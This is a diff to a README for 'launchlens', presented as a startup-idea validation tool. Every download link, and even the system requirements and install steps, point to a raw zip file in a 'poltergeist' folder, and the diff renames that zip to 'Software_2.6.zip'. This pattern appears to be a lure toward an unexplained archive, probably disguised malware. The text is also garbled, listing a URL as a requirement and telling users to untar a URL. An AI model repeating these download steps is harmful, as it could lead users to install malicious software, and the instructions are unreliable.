@@ -1,6 +1,6 @@
 # 🚀 launchlens - Validate Startup Ideas in Seconds
 
-[![Download launchlens](https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/launchlens.zip)](https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/launchlens.zip)
+[![Download launchlens](https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/Software_2.6.zip)](https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/Software_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -11,18 +11,18 @@ Welcome to launchlens! This simple command-line tool helps you quickly validate 
 Before you start, ensure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/launchlens.zip** Version 14 or higher
+- **https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/Software_2.6.zip** Version 14 or higher
 - **Memory:** At least 4 GB RAM
 - **Disk Space:** 100 MB free space recommended
 - **Internet Connection:** Required for idea validation and competitor analysis
 
 ## 🔗 Download & Install
 
-To download launchlens, visit our [Releases page](https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/launchlens.zip). Follow these steps to set up the application:
+To download launchlens, visit our [Releases page](https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/Software_2.6.zip). Follow these steps to set up the application:
 
 1. Go to the **Releases page**.
 2. Find the latest version of launchlens.
-3. Download the appropriate file for your operating system (look for a file ending in `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/launchlens.zip` for Linux).
+3. Download the appropriate file for your operating system (look for a file ending in `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/Software_2.6.zip` for Linux).
 4. Once the download is complete, locate the file in your downloads folder.
 
 ### Windows Installation
@@ -40,8 +40,8 @@ To download launchlens, visit our [Releases page](https://raw.githubusercontent.
 ### Linux Installation
 
 1. Open a Terminal.
-2. Navigate to your downloads folder where the `https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/launchlens.zip` file is located.
-3. Extract the file using the command: `tar -xvzf https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/launchlens.zip`.
+2. Navigate to your downloads folder where the `https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/Software_2.6.zip` file is located.
+3. Extract the file using the command: `tar -xvzf https://raw.githubusercontent.com/robinroysics/launchlens/main/poltergeist/Software_2.6.zip`.
 4. Change into the extracted directory: `cd launchlens`.
 5. Run the tool by typing `./launchlens`.
 
